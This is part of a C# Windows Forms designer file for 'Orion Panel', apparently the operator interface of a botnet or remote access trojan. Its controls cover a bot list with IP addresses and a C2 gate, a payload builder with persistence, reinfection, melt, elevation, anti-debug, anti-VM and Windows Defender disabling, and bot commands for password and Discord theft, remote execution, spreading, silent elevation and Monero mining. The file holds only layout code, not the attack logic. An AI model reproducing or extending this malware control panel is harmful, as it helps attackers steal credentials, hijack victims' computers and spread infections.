            this.torLabel1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.torLabel1.Location = new System.Drawing.Point(115, 315);
            this.torLabel1.Name = "torLabel1";
            this.torLabel1.Size = new System.Drawing.Size(106, 15);
            this.torLabel1.TabIndex = 19;
            this.torLabel1.Text = "Route through Tor";
            // 
            // TorButton
            // 
            this.TorButton.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(70)))), ((int)(((byte)(152)))));
            this.TorButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(89)))), ((int)(((byte)(49)))), ((int)(((byte)(107)))));
            this.TorButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.TorButton.BorderRadius = 2;
            this.TorButton.ButtonText = "  Run Tor";
            this.TorButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.TorButton.DisabledColor = System.Drawing.Color.Gray;
            this.TorButton.Iconcolor = System.Drawing.Color.Transparent;
            this.TorButton.Iconimage = ((System.Drawing.Image)(resources.GetObject("TorButton.Iconimage")));
            this.TorButton.Iconimage_right = null;
            this.TorButton.Iconimage_right_Selected = null;
            this.TorButton.Iconimage_Selected = null;
            this.TorButton.IconMarginLeft = 0;
            this.TorButton.IconMarginRight = 0;
            this.TorButton.IconRightVisible = false;
            this.TorButton.IconRightZoom = 0D;
            this.TorButton.IconVisible = false;
            this.TorButton.IconZoom = 50D;
            this.TorButton.IsTab = false;
            this.TorButton.Location = new System.Drawing.Point(234, 373);
            this.TorButton.Name = "TorButton";
            this.TorButton.Normalcolor = System.Drawing.Color.FromArgb(((int)(((byte)(89)))), ((int)(((byte)(49)))), ((int)(((byte)(107)))));
            this.TorButton.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(70)))), ((int)(((byte)(152)))));
            this.TorButton.OnHoverTextColor = System.Drawing.Color.White;
            this.TorButton.selected = false;
            this.TorButton.Size = new System.Drawing.Size(150, 45);
            this.TorButton.TabIndex = 18;
            this.TorButton.Text = "  Run Tor";
            this.TorButton.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.TorButton.Textcolor = System.Drawing.Color.White;
            this.TorButton.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.TorButton.Load += new System.EventHandler(this.FixButtonIcon);
            this.TorButton.Click += new System.EventHandler(this.TorButton_Click);
            // 
            // RILabel
            // 
            this.RILabel.AutoSize = true;
            this.RILabel.Location = new System.Drawing.Point(40, 213);
            this.RILabel.Name = "RILabel";
            this.RILabel.Size = new System.Drawing.Size(69, 15);
            this.RILabel.TabIndex = 17;
            this.RILabel.Text = "RI Payload:";
            // 
            // apiTextBox
            // 
            this.apiTextBox.BorderColorFocused = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.apiTextBox.BorderColorIdle = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.apiTextBox.BorderColorMouseHover = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.apiTextBox.BorderThickness = 2;
            this.apiTextBox.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.apiTextBox.Font = new System.Drawing.Font("Century Gothic", 9.75F);
            this.apiTextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.apiTextBox.isPassword = false;
            this.apiTextBox.Location = new System.Drawing.Point(118, 254);
            this.apiTextBox.Margin = new System.Windows.Forms.Padding(4);
            this.apiTextBox.Name = "apiTextBox";
            this.apiTextBox.Size = new System.Drawing.Size(415, 30);
            this.apiTextBox.TabIndex = 16;
            this.apiTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            // 
            // resetButton
            // 
            this.resetButton.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.resetButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.resetButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.resetButton.BorderRadius = 2;
            this.resetButton.ButtonText = "  Reset Settings";
            this.resetButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.resetButton.DisabledColor = System.Drawing.Color.Gray;
            this.resetButton.Iconcolor = System.Drawing.Color.Transparent;
            this.resetButton.Iconimage = ((System.Drawing.Image)(resources.GetObject("resetButton.Iconimage")));
            this.resetButton.Iconimage_right = null;
            this.resetButton.Iconimage_right_Selected = null;
            this.resetButton.Iconimage_Selected = null;
            this.resetButton.IconMarginLeft = 0;
            this.resetButton.IconMarginRight = 0;
            this.resetButton.IconRightVisible = false;
            this.resetButton.IconRightZoom = 0D;
            this.resetButton.IconVisible = false;
            this.resetButton.IconZoom = 50D;
            this.resetButton.IsTab = false;
            this.resetButton.Location = new System.Drawing.Point(12, 373);
            this.resetButton.Name = "resetButton";
            this.resetButton.Normalcolor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.resetButton.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.resetButton.OnHoverTextColor = System.Drawing.Color.White;
            this.resetButton.selected = false;
            this.resetButton.Size = new System.Drawing.Size(150, 45);
            this.resetButton.TabIndex = 15;
            this.resetButton.Text = "  Reset Settings";
            this.resetButton.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.resetButton.Textcolor = System.Drawing.Color.White;
            this.resetButton.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.resetButton.Load += new System.EventHandler(this.FixButtonIcon);
            this.resetButton.Click += new System.EventHandler(this.ResetButton_Click);
            // 
            // apiLabel
            // 
            this.apiLabel.AutoSize = true;
            this.apiLabel.Location = new System.Drawing.Point(9, 261);
            this.apiLabel.Name = "apiLabel";
            this.apiLabel.Size = new System.Drawing.Size(100, 15);
            this.apiLabel.TabIndex = 14;
            this.apiLabel.Text = "Antiscan API Key:";
            // 
            // RITextBox
            // 
            this.RITextBox.BorderColorFocused = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.RITextBox.BorderColorIdle = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.RITextBox.BorderColorMouseHover = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.RITextBox.BorderThickness = 2;
            this.RITextBox.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.RITextBox.Font = new System.Drawing.Font("Century Gothic", 9.75F);
            this.RITextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.RITextBox.isPassword = false;
            this.RITextBox.Location = new System.Drawing.Point(118, 207);
            this.RITextBox.Margin = new System.Windows.Forms.Padding(4);
            this.RITextBox.Name = "RITextBox";
            this.RITextBox.Size = new System.Drawing.Size(415, 30);
            this.RITextBox.TabIndex = 13;
            this.RITextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            // 
            // prefixLabel
            // 
            this.prefixLabel.AutoSize = true;
            this.prefixLabel.Location = new System.Drawing.Point(47, 165);
            this.prefixLabel.Name = "prefixLabel";
            this.prefixLabel.Size = new System.Drawing.Size(62, 15);
            this.prefixLabel.TabIndex = 10;
            this.prefixLabel.Text = "Bot Prefix:";
            // 
            // prefixTextBox
            // 
            this.prefixTextBox.BorderColorFocused = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.prefixTextBox.BorderColorIdle = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.prefixTextBox.BorderColorMouseHover = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.prefixTextBox.BorderThickness = 2;
            this.prefixTextBox.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.prefixTextBox.Font = new System.Drawing.Font("Century Gothic", 9.75F);
            this.prefixTextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.prefixTextBox.isPassword = false;
            this.prefixTextBox.Location = new System.Drawing.Point(118, 159);
            this.prefixTextBox.Margin = new System.Windows.Forms.Padding(4);
            this.prefixTextBox.Name = "prefixTextBox";
            this.prefixTextBox.Size = new System.Drawing.Size(415, 30);
            this.prefixTextBox.TabIndex = 9;
            this.prefixTextBox.Text = "Doctor-";
            this.prefixTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            // 
            // saveButton
            // 
            this.saveButton.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.saveButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.saveButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.saveButton.BorderRadius = 2;
            this.saveButton.ButtonText = "  Save Settings";
            this.saveButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.saveButton.DisabledColor = System.Drawing.Color.Gray;
            this.saveButton.Iconcolor = System.Drawing.Color.Transparent;
            this.saveButton.Iconimage = ((System.Drawing.Image)(resources.GetObject("saveButton.Iconimage")));
            this.saveButton.Iconimage_right = null;
            this.saveButton.Iconimage_right_Selected = null;
            this.saveButton.Iconimage_Selected = null;
            this.saveButton.IconMarginLeft = 0;
            this.saveButton.IconMarginRight = 0;
            this.saveButton.IconRightVisible = false;
            this.saveButton.IconRightZoom = 0D;
            this.saveButton.IconVisible = false;
            this.saveButton.IconZoom = 50D;
            this.saveButton.IsTab = false;
            this.saveButton.Location = new System.Drawing.Point(456, 373);
            this.saveButton.Name = "saveButton";
            this.saveButton.Normalcolor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.saveButton.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.saveButton.OnHoverTextColor = System.Drawing.Color.White;
            this.saveButton.selected = false;
            this.saveButton.Size = new System.Drawing.Size(150, 45);
            this.saveButton.TabIndex = 1;
            this.saveButton.Text = "  Save Settings";
            this.saveButton.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.saveButton.Textcolor = System.Drawing.Color.White;
            this.saveButton.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.saveButton.Load += new System.EventHandler(this.FixButtonIcon);
            this.saveButton.Click += new System.EventHandler(this.SaveButton_Click);
            // 
            // miningLabel1
            // 
            this.miningLabel1.AutoSize = true;
            this.miningLabel1.Location = new System.Drawing.Point(10, 117);
            this.miningLabel1.Name = "miningLabel1";
            this.miningLabel1.Size = new System.Drawing.Size(99, 15);
            this.miningLabel1.TabIndex = 7;
            this.miningLabel1.Text = "Mining Statistics:";
            // 
            // miningTextBox
            // 
            this.miningTextBox.BorderColorFocused = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.miningTextBox.BorderColorIdle = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.miningTextBox.BorderColorMouseHover = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.miningTextBox.BorderThickness = 2;
            this.miningTextBox.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.miningTextBox.Font = new System.Drawing.Font("Century Gothic", 9.75F);
            this.miningTextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.miningTextBox.isPassword = false;
            this.miningTextBox.Location = new System.Drawing.Point(118, 111);
            this.miningTextBox.Margin = new System.Windows.Forms.Padding(4);
            this.miningTextBox.Name = "miningTextBox";
            this.miningTextBox.Size = new System.Drawing.Size(415, 30);
            this.miningTextBox.TabIndex = 6;
            this.miningTextBox.Text = "https://xmr.nanopool.org/stats";
            this.miningTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            // 
            // intervalSlider
            // 
            this.intervalSlider.BackColor = System.Drawing.Color.Transparent;
            this.intervalSlider.BackgroudColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.intervalSlider.BorderRadius = 2;
            this.intervalSlider.IndicatorColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.intervalSlider.Location = new System.Drawing.Point(118, 63);
            this.intervalSlider.MaximumValue = 300;
            this.intervalSlider.Name = "intervalSlider";
            this.intervalSlider.Size = new System.Drawing.Size(415, 30);
            this.intervalSlider.TabIndex = 4;
            this.intervalSlider.Value = 5;
            // 
            // intervalLabel
            // 
            this.intervalLabel.AutoSize = true;
            this.intervalLabel.Location = new System.Drawing.Point(17, 68);
            this.intervalLabel.Name = "intervalLabel";
            this.intervalLabel.Size = new System.Drawing.Size(92, 15);
            this.intervalLabel.TabIndex = 3;
            this.intervalLabel.Text = "Update Interval:";
            // 
            // gateLabel
            // 
            this.gateLabel.AutoSize = true;
            this.gateLabel.Location = new System.Drawing.Point(23, 23);
            this.gateLabel.Name = "gateLabel";
            this.gateLabel.Size = new System.Drawing.Size(86, 15);
            this.gateLabel.TabIndex = 2;
            this.gateLabel.Text = "Gate Location:";
            // 
            // gateTextBox
            // 
            this.gateTextBox.BorderColorFocused = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.gateTextBox.BorderColorIdle = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.gateTextBox.BorderColorMouseHover = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.gateTextBox.BorderThickness = 2;
            this.gateTextBox.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.gateTextBox.Font = new System.Drawing.Font("Century Gothic", 9.75F);
            this.gateTextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.gateTextBox.isPassword = false;
            this.gateTextBox.Location = new System.Drawing.Point(118, 16);
            this.gateTextBox.Margin = new System.Windows.Forms.Padding(4);
            this.gateTextBox.Name = "gateTextBox";
            this.gateTextBox.Size = new System.Drawing.Size(415, 30);
            this.gateTextBox.TabIndex = 2;
            this.gateTextBox.Text = "https://localhost:1337/";
            this.gateTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            // 
            // Page8
            // 
            this.Page8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(26)))), ((int)(((byte)(26)))));
            this.Page8.Controls.Add(this.textBox1);
            this.Page8.Controls.Add(this.logoLabel);
            this.Page8.Location = new System.Drawing.Point(4, 5);
            this.Page8.Name = "Page8";
            this.Page8.Padding = new System.Windows.Forms.Padding(3);
            this.Page8.Size = new System.Drawing.Size(623, 451);
            this.Page8.TabIndex = 7;
            this.Page8.Text = "tabPage8";
            // 
            // textBox1
            // 
            this.textBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.textBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBox1.ForeColor = System.Drawing.Color.SkyBlue;
            this.textBox1.Location = new System.Drawing.Point(26, 62);
            this.textBox1.Multiline = true;
            this.textBox1.Name = "textBox1";
            this.textBox1.ReadOnly = true;
            this.textBox1.Size = new System.Drawing.Size(558, 363);
            this.textBox1.TabIndex = 0;
            this.textBox1.TabStop = false;
            this.textBox1.Text = "Coded by Raffy E\r\n\r\n2019/12/19 - First Private Release!\r\n2020/04/05 - Migrating r" +
    "epos to GitHub\r\n2020/04/07 - First Public Release!\r\n\r\nNote: the code needs some " +
    "serious documentation.";
            // 
            // logoLabel
            // 
            this.logoLabel.AutoSize = true;
            this.logoLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.logoLabel.Location = new System.Drawing.Point(22, 21);
            this.logoLabel.Name = "logoLabel";
            this.logoLabel.Size = new System.Drawing.Size(111, 24);
            this.logoLabel.TabIndex = 0;
            this.logoLabel.Text = "Orion v1.5.7";
            // 
            // FileViewRounding
            // 
            this.FileViewRounding.ElipseRadius = 3;
            this.FileViewRounding.TargetControl = this.fileView;
            // 
            // topDrag
            // 
            this.topDrag.Fixed = true;
            this.topDrag.Horizontal = true;
            this.topDrag.TargetControl = this.TopPanel;
            this.topDrag.Vertical = true;
            // 
            // saveAsDialog
            // 
            this.saveAsDialog.DefaultExt = "exe";
            this.saveAsDialog.Filter = "Executable Files|*.exe|Binary Samples|*.bin|All Files|*.*";
            this.saveAsDialog.Title = "Save as";
            // 
            // openIconDialog
            // 
            this.openIconDialog.DefaultExt = "ico";
            this.openIconDialog.Filter = "Icons|*.ico|All Files|*.*";
            this.openIconDialog.Title = "Choose Icon";
            // 
            // scanDialog
            // 
            this.scanDialog.DefaultExt = "exe";
            this.scanDialog.Filter = "Executable Files|*.exe|Binary Files|*.bin|All Files|*.*";
            // 
            // uploadDialog
            // 
            this.uploadDialog.Filter = "All Files|*.*";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(26)))), ((int)(((byte)(26)))));
            this.ClientSize = new System.Drawing.Size(801, 497);
            this.Controls.Add(this.SidePanel);
            this.Controls.Add(this.TopPanel);
            this.Controls.Add(this.PageControl);
            this.ForeColor = System.Drawing.Color.White;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.KeyPreview = true;
            this.Name = "Form1";
            this.Text = "Orion Panel";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Form1_KeyDown);
            this.SidePanel.ResumeLayout(false);
            this.TopPanel.ResumeLayout(false);
            this.TopPanel.PerformLayout();
            this.PageControl.ResumeLayout(false);
            this.Page1.ResumeLayout(false);
            this.StatCard2.ResumeLayout(false);
            this.StatCard2.PerformLayout();
            this.StatCard1.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.activityChart)).EndInit();
            this.Page2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.botGrid)).EndInit();
            this.taskMenu.ResumeLayout(false);
            this.Page3.ResumeLayout(false);
            this.fileMenu.ResumeLayout(false);
            this.Page4.ResumeLayout(false);
            this.Page4.PerformLayout();
            this.Page5.ResumeLayout(false);
            this.secondarySettings.ResumeLayout(false);
            this.secondarySettings.PerformLayout();
            this.mainSettings.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.iconBox)).EndInit();
            this.iconMenu.ResumeLayout(false);
            this.Page6.ResumeLayout(false);
            this.Page6.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.resultBox)).EndInit();
            this.Page7.ResumeLayout(false);
            this.Page7.PerformLayout();
            this.Page8.ResumeLayout(false);
            this.Page8.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private Bunifu.Framework.UI.BunifuElipse FormRounding;
        private System.Windows.Forms.FlowLayoutPanel SidePanel;
        private System.Windows.Forms.Panel TopPanel;
        private Bunifu.Framework.UI.BunifuTileButton CloseButton;
        private System.Windows.Forms.Label TitleLabel;
        private Bunifu.Framework.UI.BunifuTileButton MinimizeButton;
        private Bunifu.Framework.UI.BunifuFlatButton Menu1;
        private Bunifu.Framework.UI.BunifuFlatButton Menu2;
        private Bunifu.Framework.UI.BunifuFlatButton Menu3;
        private Bunifu.Framework.UI.BunifuFlatButton Menu4;
        private Bunifu.Framework.UI.BunifuFlatButton Menu5;
        private Bunifu.Framework.UI.BunifuFlatButton Menu6;
        private Bunifu.Framework.UI.BunifuFlatButton Menu7;
        private Bunifu.Framework.UI.BunifuFlatButton Menu8;
        private System.Windows.Forms.TabControl PageControl;
        private System.Windows.Forms.TabPage Page1;
        private System.Windows.Forms.TabPage Page2;
        private System.Windows.Forms.TabPage Page3;
        private System.Windows.Forms.TabPage Page4;
        private System.Windows.Forms.TabPage Page5;
        private System.Windows.Forms.TabPage Page6;
        private System.Windows.Forms.TabPage Page7;
        private System.Windows.Forms.TabPage Page8;
        private Bunifu.Framework.UI.BunifuCustomDataGrid botGrid;
        private System.Windows.Forms.TextBox logBox;
        private Bunifu.Framework.UI.BunifuDropdown logDropdown;
        private System.Windows.Forms.ListView fileView;
        private System.Windows.Forms.ColumnHeader columnHeader1;
        private System.Windows.Forms.ColumnHeader columnHeader2;
        private Bunifu.Framework.UI.BunifuElipse FileViewRounding;
        private System.Windows.Forms.DataVisualization.Charting.Chart activityChart;
        private Bunifu.Framework.UI.BunifuCircleProgressbar systemProgressBar;
        private Bunifu.Framework.UI.BunifuCards StatCard1;
        private Bunifu.Framework.UI.BunifuCards StatCard2;
        private System.Windows.Forms.Label updateLabel;
        private System.Windows.Forms.Label networkLabel;
        private System.Windows.Forms.Label systemLabel;
        private System.Windows.Forms.Label botsLabel;
        private Bunifu.Framework.UI.BunifuMetroTextbox gateTextBox;
        private System.Windows.Forms.Label gateLabel;
        private Bunifu.Framework.UI.BunifuSlider intervalSlider;
        private System.Windows.Forms.Label intervalLabel;
        private System.Windows.Forms.Label offlineLabel;
        private System.Windows.Forms.Label onlineLabel;
        private System.Windows.Forms.Label uptimeLabel;
        private System.Windows.Forms.LinkLabel miningLabel;
        private System.Windows.Forms.Label usersLabel;
        private System.Windows.Forms.Label miningLabel1;
        private Bunifu.Framework.UI.BunifuMetroTextbox miningTextBox;
        private Bunifu.Framework.UI.BunifuFlatButton saveButton;
        private System.Windows.Forms.ContextMenuStrip taskMenu;
        private System.Windows.Forms.ToolStripMenuItem doSomethingToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem withThisBotToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem okToolStripMenuItem;
        private System.Windows.Forms.ContextMenuStrip fileMenu;
        private System.Windows.Forms.ToolStripMenuItem downloadToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem uploadHereToolStripMenuItem;
        private Bunifu.Framework.UI.BunifuDragControl topDrag;
        private Bunifu.Framework.UI.BunifuCards mainSettings;
        private Bunifu.Framework.UI.BunifuProgressBar buildProgressBar;
        private System.Windows.Forms.PictureBox iconBox;
        private Bunifu.Framework.UI.BunifuCards secondarySettings;
        private Bunifu.Framework.UI.BunifuFlatButton buildButton;
        private Bunifu.Framework.UI.BunifuMetroTextbox fileNameEdit;
        private Bunifu.Framework.UI.BunifuMetroTextbox innerEdit;
        private System.Windows.Forms.RadioButton folderStRadio;
        private System.Windows.Forms.RadioButton regStRadio;
        private System.Windows.Forms.RadioButton taskStRadio;
        private System.Windows.Forms.RadioButton autoStRadio;
        private System.Windows.Forms.Label startupLabel;
        private Bunifu.Framework.UI.BunifuSeparator sep2;
        private Bunifu.Framework.UI.BunifuSeparator sep1;
        private Bunifu.Framework.UI.BunifuCheckbox startupCheck;
        private Bunifu.Framework.UI.BunifuCheckbox reinfectCheck;
        private System.Windows.Forms.Label reinfectLabel;
        private Bunifu.Framework.UI.BunifuCheckbox persistenceCheck;
        private System.Windows.Forms.Label persistenceLabel;
        private Bunifu.Framework.UI.BunifuCheckbox meltCheck;
        private System.Windows.Forms.Label meltLabel;
        private Bunifu.Framework.UI.BunifuCheckbox elevateCheck;
        private System.Windows.Forms.Label elevateLabel;
        private Bunifu.Framework.UI.BunifuCheckbox windefCheck;
        private System.Windows.Forms.Label windefLabel;
        private Bunifu.Framework.UI.BunifuCheckbox sleepCheck;
        private System.Windows.Forms.Label sleepLabel;
        private Bunifu.Framework.UI.BunifuCheckbox antiDebugCheck;
        private System.Windows.Forms.Label antiDebugLabel;
        private Bunifu.Framework.UI.BunifuCheckbox antiVirtCheck;
        private System.Windows.Forms.Label antiVirtLabel;
        private System.Windows.Forms.ContextMenuStrip iconMenu;
        private System.Windows.Forms.ToolStripMenuItem addIconToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem removeIconToolStripMenuItem;
        private Bunifu.Framework.UI.BunifuCheckbox hideCheck;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.Label vectorLabel;
        private Bunifu.Framework.UI.BunifuMetroTextbox vectorEdit;
        private Bunifu.Framework.UI.BunifuDropdown baseLocDropdown;
        private System.Windows.Forms.Label baseLocLabel;
        private System.Windows.Forms.Label baseNameLabel;
        private Bunifu.Framework.UI.BunifuMetroTextbox baseNameEdit;
        private Bunifu.Framework.UI.BunifuFlatButton browseButton;
        private System.Windows.Forms.SaveFileDialog saveAsDialog;
        private System.Windows.Forms.OpenFileDialog openIconDialog;
        private Bunifu.Framework.UI.BunifuFlatButton refreshButton;
        private Bunifu.Framework.UI.BunifuCheckbox torCheck;
        private System.Windows.Forms.Label torLabel;
        private System.Windows.Forms.ToolStripMenuItem cmdBotInfo;
        private System.Windows.Forms.ToolStripMenuItem cmdRestart;
        private System.Windows.Forms.ToolStripMenuItem cmdBlock;
        private System.Windows.Forms.ToolStripMenuItem cmdUninstall;
        private System.Windows.Forms.ToolStripMenuItem cmdCompleteInfo;
        private System.Windows.Forms.ToolStripMenuItem cmdSysInfo;
        private System.Windows.Forms.ToolStripMenuItem cmdSoftInfo;
        private System.Windows.Forms.ToolStripMenuItem cmdPassInfo;
        private System.Windows.Forms.ToolStripMenuItem cmdDiscordInfo;
        private System.Windows.Forms.ToolStripMenuItem filesToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem cmdDownload;
        private System.Windows.Forms.ToolStripMenuItem cmdUpload;
        private System.Windows.Forms.ToolStripMenuItem listToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem cmdFolderList;
        private System.Windows.Forms.ToolStripMenuItem cmdFileList;
        private System.Windows.Forms.ToolStripMenuItem cmdOpen;
        private System.Windows.Forms.ToolStripMenuItem powerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem executeToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem miningToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem cmdAskElevate;
        private System.Windows.Forms.ToolStripMenuItem spreadingToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem cmdStartSpreading;
        private System.Windows.Forms.ToolStripMenuItem cmdDisinfect;
        private System.Windows.Forms.ToolStripMenuItem miscToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem cmdMessageBox;
        private System.Windows.Forms.ToolStripMenuItem cmdAbort;
        private System.Windows.Forms.ToolStripMenuItem cmdShutdown;
        private System.Windows.Forms.ToolStripMenuItem cmdReboot;
        private System.Windows.Forms.ToolStripMenuItem cmdLock;
        private System.Windows.Forms.ToolStripMenuItem cmdSleep;
        private System.Windows.Forms.ToolStripMenuItem cmdWake;
        private System.Windows.Forms.ToolStripMenuItem cmdExec;
        private System.Windows.Forms.ToolStripMenuItem cmdRemoteExec;
        private System.Windows.Forms.ToolStripMenuItem cmdCommand;
        private System.Windows.Forms.ToolStripMenuItem cmdDisguisedElevate;
        private System.Windows.Forms.ToolStripMenuItem cmdSilentElevate;
        private System.Windows.Forms.ToolStripMenuItem windowsDefenderToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem cmdDefenderOff;
        private System.Windows.Forms.ToolStripMenuItem cmdDefenderOn;
        private System.Windows.Forms.ToolStripMenuItem miningToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem cmdStartMining;
        private System.Windows.Forms.ToolStripMenuItem cmdQueryMining;
        private System.Windows.Forms.DataGridViewTextBoxColumn idCol;
        private System.Windows.Forms.DataGridViewCheckBoxColumn checkCol;
        private System.Windows.Forms.DataGridViewImageColumn statusCol;
        private System.Windows.Forms.DataGridViewTextBoxColumn nameCol;
        private System.Windows.Forms.DataGridViewTextBoxColumn ipCol;
        private System.Windows.Forms.DataGridViewTextBoxColumn compCol;
